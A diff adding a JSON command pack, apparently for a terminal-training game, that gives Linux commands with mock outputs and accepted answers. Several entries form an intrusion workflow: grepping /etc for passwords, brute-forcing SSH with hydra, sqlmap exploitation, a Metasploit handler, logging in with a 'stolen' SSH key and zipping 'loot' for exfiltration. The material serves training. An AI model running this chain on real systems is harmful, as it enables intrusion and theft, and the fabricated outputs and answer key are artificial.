@@ -1,0 +1,332 @@
+{
+  "packId": "intermediate",
+  "title": "Ops Efficiency",
+  "summary": "Command-line routines for analysts who juggle multiple pivots per run.",
+  "difficulty": "intermediate",
+  "commands": [
+    {
+      "id": "ls-ltra",
+      "command": "ls -ltra",
+      "description": "List files sorted by time so you can spot fresh drops.",
+      "description_long": "Adds long listing, hidden entries en reverse chronological order to surface newly written files.",
+      "mock_output": "total 96\ndrwxr-xr-x 12 analyst analyst  4096 Jan 09 09:12 .\ndrwxr-xr-x  3 root    root     4096 Jan 05 08:01 ..\n-rwxr-xr-x  1 analyst analyst  1337 Jan 09 09:11 exploit.sh\n",
+      "accepted_variants": ["ls -ltra", "ls -alrt"],
+      "tags": ["navigation", "triage"]
+    },
+    {
+      "id": "find-suid",
+      "command": "find / -perm -4000 2>/dev/null",
+      "description": "Hunt for setuid binaries without cluttering stderr.",
+      "description_long": "Searches the entire filesystem for SUID executables and mutes permission errors.",
+      "mock_output": "/bin/su\n/usr/bin/sudo\n/usr/bin/passwd\n/usr/local/bin/editor\n",
+      "accepted_variants": ["find / -perm -4000 2>/dev/null"],
+      "tags": ["privesc", "discovery"]
+    },
+    {
+      "id": "grep-recursive",
+      "command": "grep -R \"password\" /etc 2>/dev/null",
+      "description": "Scan configs for leaked passwords, skip permission spam.",
+      "description_long": "Recursively searches /etc for the string password while silencing errors.",
+      "mock_output": "/etc/mysql/debian.cnf:password = supersecret\n/etc/openvpn/auth.txt:password hunter2\n",
+      "accepted_variants": ["grep -R \"password\" /etc 2>/dev/null", "grep -R password /etc 2>/dev/null"],
+      "tags": ["discovery", "text"]
+    },
+    {
+      "id": "awk-first-column",
+      "command": "awk '{print $1}' auth.log",
+      "description": "Extract the first column from auth.log for quick source IP stats.",
+      "description_long": "Prints the initial field in each line, commonly the date or host.",
+      "mock_output": "Jan\nJan\nJan\n",
+      "accepted_variants": ["awk '{print $1}' auth.log"],
+      "tags": ["parsing", "logs"]
+    },
+    {
+      "id": "sed-range",
+      "command": "sed -n '1,10p' recon.txt",
+      "description": "Print only the first ten lines of recon.txt without altering the file.",
+      "description_long": "Streams line range 1-10 using sed, useful for partial previews.",
+      "mock_output": "[recon]\ntarget=10.10.10.10\nscanner=nmap\n",
+      "accepted_variants": ["sed -n '1,10p' recon.txt"],
+      "tags": ["parsing", "text"]
+    },
+    {
+      "id": "cut-users",
+      "command": "cut -d: -f1 /etc/passwd",
+      "description": "List all local usernames for brute-force or recon.",
+      "description_long": "Cuts the first colon-separated field from /etc/passwd.",
+      "mock_output": "root\ndaemon\nanalyst\n",
+      "accepted_variants": ["cut -d: -f1 /etc/passwd"],
+      "tags": ["identity", "lists"]
+    },
+    {
+      "id": "sort-uniq",
+      "command": "sort ips.txt | uniq -c",
+      "description": "Collapse duplicate IPs and show counts for triage.",
+      "description_long": "Sorts the list then counts duplicates to surface noisy hosts.",
+      "mock_output": "  3 10.10.10.10\n 12 192.168.56.1\n",
+      "accepted_variants": ["sort ips.txt | uniq -c"],
+      "tags": ["analysis", "parsing"]
+    },
+    {
+      "id": "tr-dos",
+      "command": "tr -d '\r' payload.sh",
+      "description": "Strip Windows carriage returns before executing payloads.",
+      "description_long": "Deletes carriage return characters so scripts run cleanly on Linux.",
+      "mock_output": "#!/bin/bash\necho 'ready'\n",
+      "accepted_variants": ["tr -d '\r' payload.sh"],
+      "tags": ["cleanup", "scripts"]
+    },
+    {
+      "id": "head-auth",
+      "command": "head -n 20 /var/log/auth.log",
+      "description": "Quickly review the most recent auth attempts.",
+      "description_long": "Prints the first twenty lines for fast context.",
+      "mock_output": "Jan  9 09:11 lab sshd[1024]: Accepted password for analyst from 10.0.0.5\n...\n",
+      "accepted_variants": ["head -n 20 /var/log/auth.log"],
+      "tags": ["logs", "triage"]
+    },
+    {
+      "id": "tail-follow",
+      "command": "tail -f /var/log/syslog",
+      "description": "Stream system logs in real time while running exploits.",
+      "description_long": "Follow mode keeps printing appended lines until interrupted.",
+      "mock_output": "Jan  9 09:12 kernel: eth0: link up\nJan  9 09:12 sshd[1055]: Failed password\n",
+      "accepted_variants": ["tail -f /var/log/syslog"],
+      "tags": ["logs", "monitoring"]
+    },
+    {
+      "id": "watch-w",
+      "command": "watch -n 1 w",
+      "description": "Refresh logged-in users each second to detect new sessions.",
+      "description_long": "Runs the `w` command repeatedly every second in a separate curses view.",
+      "mock_output": "Every 1.0s: w\nUSER     TTY      FROM             LOGIN@   IDLE WHAT\n",
+      "accepted_variants": ["watch -n 1 w"],
+      "tags": ["monitoring", "identity"]
+    },
+    {
+      "id": "stat-key",
+      "command": "stat id_rsa",
+      "description": "Inspect file metadata for the private key you just found.",
+      "description_long": "Shows size, permissions and timestamps for id_rsa.",
+      "mock_output": "  File: id_rsa\n  Size: 1675       Blocks: 8          IO Block: 4096   regular file\nAccess: (0600/-rw-------)  Uid: ( 1000/ analyst)   Gid: ( 1000/ analyst)\n",
+      "accepted_variants": ["stat id_rsa"],
+      "tags": ["forensics", "files"]
+    },
+    {
+      "id": "chmod-key",
+      "command": "chmod 600 id_rsa",
+      "description": "Lock down permissions before using a harvested SSH key.",
+      "description_long": "Sets read/write for owner only so SSH accepts the key.",
+      "mock_output": "",
+      "accepted_variants": ["chmod 600 id_rsa"],
+      "tags": ["hardening", "ssh"]
+    },
+    {
+      "id": "chown-notes",
+      "command": "chown analyst:analyst notes.txt",
+      "description": "Take ownership of dropped loot for later editing.",
+      "description_long": "Changes file owner and group to analyst.",
+      "mock_output": "",
+      "accepted_variants": ["chown analyst:analyst notes.txt"],
+      "tags": ["files", "workflow"]
+    },
+    {
+      "id": "scp-port",
+      "command": "scp -P 2222 id_rsa analyst@10.0.0.9:/tmp/id_rsa",
+      "description": "Upload the key over a non-standard SSH port.",
+      "description_long": "Copies id_rsa to the remote /tmp directory using port 2222.",
+      "mock_output": "id_rsa                                     100% 1675     1.6KB/s   00:00\n",
+      "accepted_variants": ["scp -P 2222 id_rsa analyst@10.0.0.9:/tmp/id_rsa"],
+      "tags": ["ssh", "transfer"]
+    },
+    {
+      "id": "ssh-custom-port",
+      "command": "ssh analyst@10.0.0.9 -p 2222",
+      "description": "Connect to the foothold service on its hidden port.",
+      "description_long": "Uses the `-p` flag to set the destination port.",
+      "mock_output": "analyst@10.0.0.9's password:\n",
+      "accepted_variants": ["ssh analyst@10.0.0.9 -p 2222", "ssh -p 2222 analyst@10.0.0.9"],
+      "tags": ["ssh", "access"]
+    },
+    {
+      "id": "ssh-key",
+      "command": "ssh -i id_rsa root@10.0.0.9",
+      "description": "Use the stolen key directly for root access.",
+      "description_long": "Loads the supplied private key via `-i` flag.",
+      "mock_output": "root@10.0.0.9:~#\n",
+      "accepted_variants": ["ssh -i id_rsa root@10.0.0.9", "ssh root@10.0.0.9 -i id_rsa"],
+      "tags": ["ssh", "privesc"]
+    },
+    {
+      "id": "rsync-pull",
+      "command": "rsync -avzh analyst@10.0.0.9:/srv/logs/ ./logs/",
+      "description": "Mirror remote logs locally with compression and progress.",
+      "description_long": "Archives remote /srv/logs into ./logs using rsync over SSH.",
+      "mock_output": "receiving incremental file list\nlogs/http.log\nlogs/auth.log\n",
+      "accepted_variants": ["rsync -avzh analyst@10.0.0.9:/srv/logs/ ./logs/"],
+      "tags": ["transfer", "sync"]
+    },
+    {
+      "id": "curl-head",
+      "command": "curl -I https://target.local",
+      "description": "Check response headers for stack leaks or security hints.",
+      "description_long": "Sends a HEAD request via curl.",
+      "mock_output": "HTTP/1.1 200 OK\nServer: nginx\nX-Frame-Options: DENY\n",
+      "accepted_variants": ["curl -I https://target.local"],
+      "tags": ["web", "recon"]
+    },
+    {
+      "id": "curl-status",
+      "command": "curl -sSf https://target.local/api/status",
+      "description": "Quietly poll the status API and fail fast on non-200 codes.",
+      "description_long": "Combines silent, show errors, and fail flags.",
+      "mock_output": "{\"status\":\"ok\",\"uptime\":123456}\n",
+      "accepted_variants": ["curl -sSf https://target.local/api/status"],
+      "tags": ["web", "api"]
+    },
+    {
+      "id": "wget-robots",
+      "command": "wget -qO- http://target.local/robots.txt",
+      "description": "Dump robots.txt to find disallowed paths.",
+      "description_long": "Downloads robots.txt to stdout quietly.",
+      "mock_output": "User-agent: *\nDisallow: /backup\n",
+      "accepted_variants": ["wget -qO- http://target.local/robots.txt"],
+      "tags": ["web", "recon"]
+    },
+    {
+      "id": "nmap-service",
+      "command": "nmap -sC -sV 10.10.10.56",
+      "description": "Run default scripts and version detection for quick service intel.",
+      "description_long": "Uses NSE default scripts and probes service versions.",
+      "mock_output": "PORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.4p1\n80/tcp   open  http    nginx 1.20.1\n",
+      "accepted_variants": ["nmap -sC -sV 10.10.10.56"],
+      "tags": ["recon", "nmap"]
+    },
+    {
+      "id": "nmap-fast",
+      "command": "nmap -p- --min-rate 5000 10.10.10.56",
+      "description": "Scan all TCP ports quickly to reveal hidden services.",
+      "description_long": "Covers 1-65535 with increased packet rate.",
+      "mock_output": "Discovered open port 8443/tcp on 10.10.10.56\n",
+      "accepted_variants": ["nmap -p- --min-rate 5000 10.10.10.56"],
+      "tags": ["recon", "nmap"]
+    },
+    {
+      "id": "dig-txt",
+      "command": "dig +short -t TXT corp.local",
+      "description": "Retrieve TXT records for domain clues or flags.",
+      "description_long": "Uses dig to query TXT records and print a short answer.",
+      "mock_output": "\"v=spf1 ip4:10.0.0.0/24 -all\"\n",
+      "accepted_variants": ["dig +short -t TXT corp.local"],
+      "tags": ["dns", "recon"]
+    },
+    {
+      "id": "feroxbuster",
+      "command": "feroxbuster -u http://target.local -w wordlist.txt",
+      "description": "Bruteforce directories with recursive speed.",
+      "description_long": "Launches feroxbuster with default threads using wordlist.txt.",
+      "mock_output": "200      12l      158w     1824c http://target.local/admin\n",
+      "accepted_variants": ["feroxbuster -u http://target.local -w wordlist.txt"],
+      "tags": ["web", "fuzzing"]
+    },
+    {
+      "id": "gobuster-dns",
+      "command": "gobuster dns -d corp.local -w subdomains.txt",
+      "description": "Enumerate subdomains via gobuster DNS mode.",
+      "description_long": "Probes DNS records from subdomains.txt.",
+      "mock_output": "Found: dev.corp.local\nFound: stage.corp.local\n",
+      "accepted_variants": ["gobuster dns -d corp.local -w subdomains.txt"],
+      "tags": ["dns", "fuzzing"]
+    },
+    {
+      "id": "hydra-ssh",
+      "command": "hydra -l analyst -P rockyou.txt ssh://10.10.10.23",
+      "description": "Launch a targeted SSH brute-force with Hydra.",
+      "description_long": "Attempts passwords from rockyou.txt for user analyst.",
+      "mock_output": "[22][ssh] host: 10.10.10.23   login: analyst   password: tr1ckster\n",
+      "accepted_variants": ["hydra -l analyst -P rockyou.txt ssh://10.10.10.23"],
+      "tags": ["bruteforce", "ssh"]
+    },
+    {
+      "id": "sqlmap-basic",
+      "command": "sqlmap -u \"http://target.local/item?id=1\" --batch",
+      "description": "Exploit a GET parameter with sqlmap in unattended mode.",
+      "description_long": "`--batch` accepts defaults so it runs without prompts.",
+      "mock_output": "[INFO] the back-end DBMS is MySQL\nDatabase: target\n[3 tables]\n",
+      "accepted_variants": ["sqlmap -u \"http://target.local/item?id=1\" --batch"],
+      "tags": ["web", "sql"]
+    },
+    {
+      "id": "msf-handler",
+      "command": "msfconsole -q -x \"use exploit/multi/handler\"",
+      "description": "Prime Metasploit's handler without banners.",
+      "description_long": "Quiet start and auto-runs the specified command chain.",
+      "mock_output": "[*] Starting persistent handler...\n",
+      "accepted_variants": ["msfconsole -q -x \"use exploit/multi/handler\""],
+      "tags": ["framework", "payload"]
+    },
+    {
+      "id": "proxychains-nmap",
+      "command": "proxychains nmap -sT 10.10.10.56",
+      "description": "Route nmap through the configured proxy list.",
+      "description_long": "Relies on proxychains.conf to tunnel the scan.",
+      "mock_output": "Starting Nmap 7.94 ( https://nmap.org )\n",
+      "accepted_variants": ["proxychains nmap -sT 10.10.10.56"],
+      "tags": ["pivot", "nmap"]
+    },
+    {
+      "id": "ssh-tunnel",
+      "command": "ssh -L 8080:127.0.0.1:80 pivot@10.10.20.5",
+      "description": "Expose remote web service through a local tunnel.",
+      "description_long": "Creates a local port forward from 8080 to remote 80.",
+      "mock_output": "pivot@10.10.20.5's password:\n",
+      "accepted_variants": ["ssh -L 8080:127.0.0.1:80 pivot@10.10.20.5"],
+      "tags": ["pivot", "ssh"]
+    },
+    {
+      "id": "tmux-session",
+      "command": "tmux new -s recon",
+      "description": "Start a tmux session for compartmentalised recon flows.",
+      "description_long": "Creates a new session named recon.",
+      "mock_output": "",
+      "accepted_variants": ["tmux new -s recon"],
+      "tags": ["workflow", "terminal"]
+    },
+    {
+      "id": "scp-recursive",
+      "command": "scp -r reports pivot@10.10.20.5:/var/tmp/reports",
+      "description": "Recursively upload your reporting folder.",
+      "description_long": "Transfers directory trees via SCP.",
+      "mock_output": "reports/index.html                          100% 4096    4.0KB/s   00:00\n",
+      "accepted_variants": ["scp -r reports pivot@10.10.20.5:/var/tmp/reports"],
+      "tags": ["transfer", "ssh"]
+    },
+    {
+      "id": "zip-encrypt",
+      "command": "zip -r --password=tr1ckster loot.zip loot/",
+      "description": "Archive loot with a simple password before exfiltration.",
+      "description_long": "Creates an encrypted zip archive named loot.zip.",
+      "mock_output": "  adding: loot/ (stored 0%)\n  adding: loot/notes.txt (deflated 42%)\n",
+      "accepted_variants": ["zip -r --password=tr1ckster loot.zip loot/"],
+      "tags": ["transfer", "files"]
+    },
+    {
+      "id": "hashcat-wordlist",
+      "command": "hashcat -a 0 hashes.txt rockyou.txt",
+      "description": "Run a straight wordlist attack against the captured hash list.",
+      "description_long": "Default mode (-a 0) matches wordlist entries.",
+      "mock_output": "Session..........: hashcat\nStatus...........: Running\n",
+      "accepted_variants": ["hashcat -a 0 hashes.txt rockyou.txt"],
+      "tags": ["cracking", "passwords"]
+    },
+    {
+      "id": "gpg-symmetric",
+      "command": "gpg --symmetric --cipher-algo AES256 ops_notes.md",
+      "description": "Encrypt notes with GPG before syncing to shared storage.",
+      "description_long": "Uses symmetric AES256 encryption on ops_notes.md.",
+      "mock_output": "",
+      "accepted_variants": ["gpg --symmetric --cipher-algo AES256 ops_notes.md"],
+      "tags": ["crypto", "files"]
+    }
+  ]
+}
